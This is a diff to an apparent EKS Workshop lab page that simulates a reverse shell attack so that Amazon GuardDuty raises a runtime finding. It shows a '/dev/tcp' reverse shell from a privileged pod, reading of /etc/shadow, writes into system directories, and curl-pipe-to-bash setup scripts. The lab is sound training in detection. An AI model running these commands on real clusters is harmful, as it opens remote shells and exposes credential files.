@@ -5,14 +5,10 @@ sidebar_position: 142
 
 In this last lab exercise for Amazon GuardDuty findings, you'll simulate a reverse shell attack in your EKS Cluster environment.
 
-This one is a little tricky and since we want to run it as a simulation in a controlled environment, it will require you to create another Cloud9 environment that will serve as the offensor instance. To do that, open your [CloudShell](https://console.aws.amazon.com/cloudshell/home), and run the following commands.
+This one is a little tricky and since we want to run it as a simulation in a controlled environment, it will require you to create another Cloud9 environment that will serve as the offensor instance. To do that, open your [CloudShell](https://console.aws.amazon.com/cloudshell/home), and run the following command.
 
 ```bash
-$ export RSHELL_SUBNET=$(aws ec2 describe-subnets --query 'Subnets[0].SubnetId' --filters "Name=tag:Name,Values=*SubnetPrivate*" --output text)
-$ export RSHELL_IDE=$(aws cloud9 create-environment-ec2 --name reverse-shell --instance-type t2.micro --connection-type CONNECT_SSM --subnet-id $RSHELL_SUBNET --query 'environmentId' --output text)
-$ sleep 60
-$ export RSHELL_SG=$(aws cloudformation describe-stack-resource --stack-name aws-cloud9-rshell-$RSHELL_IDE --logical-resource-id InstanceSecurityGroup --query 'StackResourceDetail.PhysicalResourceId')
-$ aws ec2 authorize-security-group-ingress --group-id $RSHELL_SG --protocol all --port 6666 --cidr 10.42.0.0/16
+$ curl -fsSL https://raw.githubusercontent.com/aws-samples/eks-workshop-v2/main/lab/scripts/rshell-setup.sh | bash
 ```
 
 Open another tab in your browser and go to the [Amazon Cloud9 Console](https://console.aws.amazon.com/cloud9control/home). You should se another IDE environment with the nama `rshell`, click on the **Open** link next to the IDE environment name.
@@ -38,7 +34,7 @@ This last command will start listening all connections on port 6666.
 Now, go back to the `eks-workshop-ide` terminal, and run a new Pod that will emulate the compromised workload.
 
 ```bash
-$ kubectl run -ti --rm --restart=Never --image=ubuntu --privileged reverse-shell -- /bin/bash -c "bash -i >& /dev/tcp//6666 0>&1"
+$ kubectl run -ti --rm --restart=Never --image=ubuntu --privileged rshell -- /bin/bash -c "bash -i >& /dev/tcp//6666 0>&1"
 If you don't see a command prompt, try pressing enter.
 ``` 
 
@@ -51,6 +47,7 @@ $ cat /etc/shadow
 $ chroot /
 $ touch /etc/dangerousfile
 $ mkdir /bin/dangerousfolder
+$ exit
 $ ls /etc/danger*
 ```
 
@@ -63,7 +60,7 @@ $ exit
 
 ```
 
-On the `eks-workshop-ide` Cloud9 IDE, you'll see the following message `pod "reverse-shell" deleted`.
+On the `eks-workshop-ide` Cloud9 IDE, you'll see the following message `pod "rshell" deleted`.
 
 
 If you open the [GuardDuty Findings console](https://console.aws.amazon.com/guardduty/home#/findings), you will see the `Execution:Runtime/ReverseShell` finding.
@@ -71,8 +68,8 @@ If you open the [GuardDuty Findings console](https://console.aws.amazon.com/guar
 ![](assets/reverse-shell.png)
 
 
-To clean up, delete the `reverse-shell` Cloud9 IDE environment, on your [CloudShell](https://console.aws.amazon.com/cloudshell/home).
+To clean up, run the following command on your [CloudShell](https://console.aws.amazon.com/cloudshell/home).
 
 ```bash
-$ aws cloudformation list-stacks --stack-status-filter CREATE_COMPLETE --query 'StackSummaries[].StackName' | awk -F , '/reverse-shell/ {print $1}' | xargs aws cloudformation delete-stack --stack-name
+$ curl -fsSL https://raw.githubusercontent.com/aws-samples/eks-workshop-v2/main/lab/scripts/rshell-cleanup.sh | bash
 ```
